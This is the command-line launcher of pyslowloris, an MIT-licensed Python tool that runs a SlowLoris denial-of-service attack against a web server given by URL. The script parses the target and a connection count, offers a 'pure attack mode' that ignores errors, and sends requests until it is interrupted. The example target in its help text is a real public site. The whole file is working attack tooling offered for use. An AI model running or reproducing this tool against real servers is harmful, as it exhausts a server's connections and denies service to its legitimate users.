"""
MIT License

Copyright (c) 2017 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
import argparse
import sys

from pyslowloris import HostAddress, SlowLorisAttack


def _parse_args() -> dict:
    parser = argparse.ArgumentParser(
        add_help=True,
        description="Asynchronous Python implementation of SlowLoris attack"
    )
    parser.add_argument(
        "-u", "--url", action="store", type=str, required=True,
        help="Link to a web server (http://google.com) - str"
    )
    # 247 is magic number to prevent OSError: [Errno 24] Too many open files
    parser.add_argument(
        "-c", "--connection-count", default=247, action="store", type=int,
        help="Count of active connections (default value is 247) - int"
    )
    parser.add_argument(
        "-s", "--silent", action='store_true',
        help="Ignore all of the errors [pure attack mode] - bool"
    )

    # TODO(mkrivich): add support of this flag
    # parser.add_argument(
    #     "-v", "--verbose", action='store_false',
    #     help="Produce more logs - bool"
    # )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(-1)

    result = {}

    args = parser.parse_args()
    if args.url:
        try:
            result["address"] = HostAddress.from_url(args.url)
        except Exception:
            parser.print_help()
            sys.exit(-1)
    if not (0 < args.connection_count <= 300):
        parser.print_help()
        sys.exit(-1)
    result["connections_count"] = args.connection_count
    result["silent"] = args.silent

    return result


def _run(target: HostAddress, connections_count: int, silent: bool) -> None:
    print("Attack info:")
    print(f"\tTarget: {str(target)}({target.ip_address})")
    print(f"\tConnection count: {connections_count}")
    print(f"\tMode (silent): {silent}")
    loris = SlowLorisAttack(target, connections_count, silent=silent)
    loris.start()


def main():
    args = _parse_args()
    # Sending requests until Ctrl+C is pressed
    try:
        _run(args["address"], args["connections_count"], args["silent"])
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as ex:
        print(ex)
